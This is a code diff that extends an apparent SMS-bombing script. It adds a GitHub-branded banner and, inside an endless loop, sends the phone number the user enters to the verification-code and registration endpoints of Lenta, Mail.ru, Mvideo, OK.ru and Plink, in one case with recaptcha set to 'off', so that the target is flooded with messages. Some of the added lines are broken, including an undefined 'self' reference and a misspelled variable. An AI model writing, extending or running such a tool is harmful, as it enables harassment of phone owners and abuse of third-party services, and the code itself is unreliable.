@@ -4,11 +4,26 @@ import datetime
 import time
 import sys
 import os
+from colorama import Fore, Back
+red = Fore.RED
+green = Fore.GREEN
+yellow = Fore.YELLOW
+blue = Fore.BLUE
+dark = Back.BLACK
+bef = Fore.WHITE
 iteration = 0
+resh = "< ##############"
+logo = '''
++--{×=============>
+https://github.com/direskyfer/
++--{×=============>
+'''
 diskfe = "7########"
-online = "13 services available"
-print(diskfe+"\n"+online)
+print(dark+"")
+print(diskfe + "\n" + red + "My" + yellow + "GIT"+green+"HUB"+bef + logo)
 _phone = input("phone: ")
+print("\n")
+print(resh + "Start >")
 es = ""
 er = " "
 if _phone[0] == '8':
@@ -92,6 +107,36 @@ while True:
 	except:
 		pass
 	try:
+		requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
+		print('Lenta')
+	except:
+		pass
+
+	try:
+		requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
+		print('Mail.ru')
+	except:
+		pass
+
+	try:
+		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
+		print('Mvideo')
+	except:
+		pass
+
+	try:
+		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
+		print('OK.ru')
+	except:
+		pass
+
+	try:
+		requests.post('https://plink.tech/register/',json={"phone": _phone})
+		print("Plink")
+	except:
+		pass
+	try:
 		iteration += 1
+		print(resh + interation +"= cycles done >")
 	except:
 		pass
